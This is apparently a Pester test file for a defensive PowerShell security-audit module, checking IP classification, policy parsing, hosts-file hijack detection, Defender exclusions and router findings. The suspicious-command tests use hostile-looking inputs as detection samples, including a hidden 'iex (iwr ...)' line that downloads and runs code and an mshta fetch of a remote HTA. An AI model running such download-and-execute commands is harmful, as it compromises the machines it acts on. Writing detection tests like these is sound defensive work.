Describe 'Audit helpers (1.2.0)' {
    BeforeAll {
        Import-Module (Join-Path $PSScriptRoot '..' 'NetSecToolkit' 'NetSecToolkit.psd1') -Force
    }

    AfterAll { Remove-Module NetSecToolkit -ErrorAction SilentlyContinue }

    Context 'Test-PrivateIPv4' {
        It 'recognizes private, CGNAT, link-local and loopback addresses' {
            InModuleScope NetSecToolkit {
                foreach ($ip in '10.1.2.3', '172.16.0.1', '172.31.255.254', '192.168.1.10', '169.254.7.7', '100.64.0.1', '127.0.0.1') {
                    Test-PrivateIPv4 $ip | Should -BeTrue
                }
            }
        }
        It 'treats public addresses and non-IPv4 text as not private' {
            InModuleScope NetSecToolkit {
                foreach ($ip in '8.8.8.8', '172.32.0.1', '100.128.0.1', '192.169.1.1', 'fe80::1', '') {
                    Test-PrivateIPv4 $ip | Should -BeFalse
                }
            }
        }
    }

    Context 'Test-InLocalNetwork' {
        It 'matches addresses inside a subnet and rejects ones outside' {
            InModuleScope NetSecToolkit {
                $nets = @([pscustomobject]@{ Net = [uint32](ConvertTo-UInt32 '192.168.50.0'); Mask = [uint32]4294967040 })
                Test-InLocalNetwork -Address '192.168.50.77' -Network $nets | Should -BeTrue
                Test-InLocalNetwork -Address '192.168.51.77' -Network $nets | Should -BeFalse
                Test-InLocalNetwork -Address '45.33.32.156' -Network $nets | Should -BeFalse
            }
        }
        It 'does not flag an address it cannot parse' {
            InModuleScope NetSecToolkit { Test-InLocalNetwork -Address 'not-an-ip' -Network @() | Should -BeTrue }
        }
    }

    Context 'ConvertFrom-NetAccount' {
        It 'reads the password and lockout policy' {
            InModuleScope NetSecToolkit {
                $p = ConvertFrom-NetAccount -Text @(
                    'Force user logoff how long after time expires?:       Never'
                    'Minimum password age (days):                          0'
                    'Maximum password age (days):                          42'
                    'Minimum password length:                              8'
                    'Length of password history maintained:                None'
                    'Lockout threshold:                                    10'
                    'Lockout duration (minutes):                           30'
                    'The command completed successfully.'
                )
                $p.MinLength | Should -Be 8
                $p.MaxAgeDays | Should -Be 42
                $p.History | Should -Be 0
                $p.LockoutThreshold | Should -Be 10
                $p.LockoutMinutes | Should -Be 30
            }
        }
        It 'turns "Never" into 0 and returns nothing for unreadable output' {
            InModuleScope NetSecToolkit {
                (ConvertFrom-NetAccount -Text 'Minimum password length:   0', 'Lockout threshold:   Never').LockoutThreshold | Should -Be 0
                ConvertFrom-NetAccount -Text 'System error 5 has occurred.' | Should -BeNullOrEmpty
            }
        }
    }

    Context 'ConvertFrom-NetLocalGroup' {
        It 'returns only the member lines' {
            InModuleScope NetSecToolkit {
                $m = @(ConvertFrom-NetLocalGroup -Text @(
                    'Alias name     Administrators'
                    'Comment        Administrators have complete and unrestricted access'
                    ''
                    'Members'
                    ''
                    '-------------------------------------------------------------------------------'
                    'Administrator'
                    'Edward'
                    'The command completed successfully.'
                ))
                $m -join ',' | Should -Be 'Administrator,Edward'
            }
        }
    }

    Context 'ConvertTo-UsbStorageRecord' {
        It 'splits the model and serial, and keeps the instance key for snapshots' {
            InModuleScope NetSecToolkit {
                $r = ConvertTo-UsbStorageRecord -ModelKey 'Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00' -InstanceKey '4C530001230927115284&0' -FriendlyName 'SanDisk Ultra USB Device'
                $r.Device | Should -Be 'SanDisk Ultra USB Device'
                $r.Kind | Should -Be 'Disk'
                $r.Serial | Should -Be '4C530001230927115284'
                $r.NoSerial | Should -BeFalse
                $r.InstanceId | Should -Be '4C530001230927115284&0'
            }
        }
        It 'marks serials Windows made up, and falls back to the model key for the name' {
            InModuleScope NetSecToolkit {
                $r = ConvertTo-UsbStorageRecord -ModelKey 'Disk&Ven_Generic&Prod_Flash' -InstanceKey '6&2a9e7b1c&0' -FriendlyName ''
                $r.NoSerial | Should -BeTrue
                $r.Device | Should -Be 'Disk&Ven_Generic&Prod_Flash'
            }
        }
    }

    Context 'Get-CommandPath' {
        It 'takes the quoted program from a command line' {
            InModuleScope NetSecToolkit {
                Get-CommandPath '"C:\Program Files\App\app.exe" /min' | Should -Be 'C:\Program Files\App\app.exe'
            }
        }
        It 'finds an unquoted program path that contains spaces' {
            InModuleScope NetSecToolkit {
                Get-CommandPath 'C:\Program Files\App\app.exe -k netsvcs' | Should -Be 'C:\Program Files\App\app.exe'
            }
        }
        It 'resolves \SystemRoot\ and \??\ prefixes' {
            InModuleScope NetSecToolkit {
                Get-CommandPath '\SystemRoot\System32\drivers\x.sys' -WindowsDir 'C:\Windows' | Should -Be 'C:\Windows\System32\drivers\x.sys'
                Get-CommandPath '\??\C:\Tools\y.exe' | Should -Be 'C:\Tools\y.exe'
            }
        }
        It 'returns an empty string for an empty command' {
            InModuleScope NetSecToolkit { Get-CommandPath '' | Should -Be '' }
        }
    }

    Context 'Get-SuspiciousReason' {
        It 'flags the usual hiding places' {
            InModuleScope NetSecToolkit {
                Get-SuspiciousReason -Path 'C:\Users\Ed\AppData\Local\Temp\upd.exe' | Should -Match 'Temp folder'
                Get-SuspiciousReason -Path 'C:\$Recycle.Bin\S-1-5-21\x.exe' | Should -Match 'Recycle Bin'
                Get-SuspiciousReason -Path 'C:\Users\Ed\AppData\Roaming\winupd.exe' | Should -Match 'directly in AppData'
                Get-SuspiciousReason -Path 'C:\ProgramData\x.exe' | Should -Match 'directly in ProgramData'
                Get-SuspiciousReason -Path 'C:\Users\Public\svc.exe' | Should -Match 'Public user folder'
                Get-SuspiciousReason -Path 'C:\Users\Ed\Desktop\invoice.pdf.exe' | Should -Match 'double file extension'
                Get-SuspiciousReason -Path 'C:\Users\Ed\Documents\photo.scr' | Should -Match 'screen saver'
            }
        }
        It 'flags script hosts that fetch web content and encoded PowerShell' {
            InModuleScope NetSecToolkit {
                Get-SuspiciousReason -Path 'mshta.exe' -Command 'mshta.exe http://example.test/a.hta' | Should -Match 'script or web content'
                Get-SuspiciousReason -Path 'powershell.exe' -Command 'powershell.exe -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA' | Should -Match 'encoded command'
                Get-SuspiciousReason -Path 'powershell.exe' -Command 'powershell -WindowStyle Hidden -c "iex (iwr https://example.test/x)"' | Should -Match 'hidden PowerShell|script or web content'
            }
        }
        It 'leaves normal programs alone' {
            InModuleScope NetSecToolkit {
                Get-SuspiciousReason -Path 'C:\Program Files\Microsoft OneDrive\OneDrive.exe' -Command '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background' | Should -Be ''
                Get-SuspiciousReason -Path 'C:\Users\Ed\AppData\Local\Programs\App\app.exe' | Should -Be ''
                Get-SuspiciousReason -Path 'C:\Program Files\Browser\browser.exe' -Command '"C:\Program Files\Browser\browser.exe" --app=https://example.test' | Should -Be ''
                Get-SuspiciousReason -Path 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Command 'powershell.exe -File C:\Scripts\backup.ps1' | Should -Be ''
            }
        }
    }

    Context 'Hosts file' {
        It 'parses entries and skips comments' {
            InModuleScope NetSecToolkit {
                $e = @(ConvertFrom-HostsFile -Text '# comment', '', '127.0.0.1 localhost', '0.0.0.0 www.VirusTotal.com update.microsoft.com # blocked', '10.0.0.5 nas')
                $e.Count | Should -Be 4
                $e[1].Name | Should -Be 'www.virustotal.com'
                $e[1].Address | Should -Be '0.0.0.0'
            }
        }
        It 'spots redirected security and update sites only' {
            InModuleScope NetSecToolkit {
                $e = @(ConvertFrom-HostsFile -Text '0.0.0.0 www.virustotal.com update.microsoft.com', '10.0.0.5 nas', '0.0.0.0 ads.example.test')
                (Get-HostsHijack -Entry $e).Name -join ',' | Should -Be 'www.virustotal.com,update.microsoft.com'
            }
        }
    }

    Context 'ConvertFrom-AutorunInf' {
        It 'returns the program an autorun.inf launches' {
            InModuleScope NetSecToolkit {
                ConvertFrom-AutorunInf -Text '[autorun]', 'icon=drive.ico', 'open=setup.exe /s' | Should -Be 'setup.exe /s'
                ConvertFrom-AutorunInf -Text '[autorun]', 'shell\open\command=evil.exe' | Should -Be 'evil.exe'
                ConvertFrom-AutorunInf -Text '[autorun]', 'label=Backup', 'icon=drive.ico' | Should -Be ''
            }
        }
    }

    Context 'Get-UpdateAgeRating' {
        It 'rates recent, late and very late updates' {
            InModuleScope NetSecToolkit {
                $now = [datetime]'2026-11-27'
                (Get-UpdateAgeRating -LastUpdate $now.AddDays(-12) -Now $now).Level | Should -Be 'OK'
                (Get-UpdateAgeRating -LastUpdate $now.AddDays(-60) -Now $now).Level | Should -Be 'Warn'
                $late = Get-UpdateAgeRating -LastUpdate $now.AddDays(-200) -Now $now
                $late.Level | Should -Be 'Risk'
                $late.Days | Should -Be 200
            }
        }
        It 'treats an install date a day ahead of local time as today' {
            InModuleScope NetSecToolkit {
                $now = [datetime]'2026-11-26 23:43'
                $r = Get-UpdateAgeRating -LastUpdate ([datetime]'2026-11-27') -Now $now
                $r.Days | Should -Be 0
                $r.Level | Should -Be 'OK'
                $r.Text | Should -Match '2026-11-26'
            }
        }
                It 'reports an unknown date as information, not as a problem' {
            InModuleScope NetSecToolkit {
                $r = Get-UpdateAgeRating -LastUpdate $null
                $r.Level | Should -Be 'Info'
                $r.Days | Should -BeNullOrEmpty
            }
        }
    }

    Context 'ConvertFrom-SecurityCenterState' {
        It 'decodes real-time and definition status' {
            InModuleScope NetSecToolkit {
                $on = ConvertFrom-SecurityCenterState -ProductState 397568    # 0x061100: on, up to date
                $on.RealTime | Should -BeTrue
                $on.UpToDate | Should -BeTrue
                $off = ConvertFrom-SecurityCenterState -ProductState 393472   # 0x060100: off
                $off.RealTime | Should -BeFalse
                $old = ConvertFrom-SecurityCenterState -ProductState 397584   # 0x061110: on, out of date
                $old.RealTime | Should -BeTrue
                $old.UpToDate | Should -BeFalse
            }
        }
    }

    Context 'Test-BroadExclusion' {
        It 'flags exclusions that hide a drive, a profile or a script host' {
            InModuleScope NetSecToolkit {
                Test-BroadExclusion -Kind ExclusionPath -Value 'C:\' | Should -BeTrue
                Test-BroadExclusion -Kind ExclusionPath -Value 'C:\Users\Ed' | Should -BeTrue
                Test-BroadExclusion -Kind ExclusionPath -Value 'C:\Users\Ed\AppData\Local\Temp' | Should -BeTrue
                Test-BroadExclusion -Kind ExclusionExtension -Value '.exe' | Should -BeTrue
                Test-BroadExclusion -Kind ExclusionProcess -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' | Should -BeTrue
            }
        }
        It 'accepts narrow exclusions' {
            InModuleScope NetSecToolkit {
                Test-BroadExclusion -Kind ExclusionPath -Value 'C:\Games\SomeGame' | Should -BeFalse
                Test-BroadExclusion -Kind ExclusionExtension -Value 'vhdx' | Should -BeFalse
                Test-BroadExclusion -Kind ExclusionProcess -Value 'C:\Program Files\App\app.exe' | Should -BeFalse
            }
        }
    }

    Context 'Router findings' {
        It 'reads the Server and Location headers of an SSDP reply' {
            InModuleScope NetSecToolkit {
                $r = ConvertFrom-SsdpResponse -Text "HTTP/1.1 200 OK`r`nSERVER: Linux/5.4 UPnP/1.1 MiniUPnPd/2.1`r`nLOCATION: http://192.168.50.1:5000/rootDesc.xml`r`n`r`n"
                $r.Server | Should -Be 'Linux/5.4 UPnP/1.1 MiniUPnPd/2.1'
                $r.Location | Should -Be 'http://192.168.50.1:5000/rootDesc.xml'
            }
        }
        It 'rates open router ports, an HTTP-only admin page and UPnP' {
            InModuleScope NetSecToolkit {
                $ports = @(
                    [pscustomobject]@{ Port = 23; Service = 'Telnet'; Open = $true; Risk = 'High' }
                    [pscustomobject]@{ Port = 80; Service = 'Web admin (HTTP)'; Open = $true; Risk = 'Review' }
                    [pscustomobject]@{ Port = 8443; Service = 'Web admin (HTTPS)'; Open = $false; Risk = 'Expected' }
                )
                $f = @(Get-RouterFinding -Result $ports -Upnp ([pscustomobject]@{ Server = 'MiniUPnPd' }) -UpnpChecked 6>$null)
                @($f | Where-Object Level -eq 'Risk').Count | Should -Be 1
                ($f | Where-Object Level -eq 'Risk').Message | Should -Match 'port 23'
                @($f | Where-Object Message -match 'HTTP only').Count | Should -Be 1
                @($f | Where-Object Message -match 'UPnP discovery \(MiniUPnPd\)').Count | Should -Be 1
            }
        }
        It 'is satisfied when nothing risky answers and UPnP is silent' {
            InModuleScope NetSecToolkit {
                $ports = @(
                    [pscustomobject]@{ Port = 53; Service = 'DNS'; Open = $true; Risk = 'Expected' }
                    [pscustomobject]@{ Port = 8443; Service = 'Web admin (HTTPS)'; Open = $true; Risk = 'Expected' }
                )
                $f = @(Get-RouterFinding -Result $ports -Upnp $null -UpnpChecked 6>$null)
                @($f | Where-Object { $_.Level -in 'Risk', 'Warn' }).Count | Should -Be 0
                @($f | Where-Object Level -eq 'OK').Count | Should -Be 1
            }
        }
    }
}
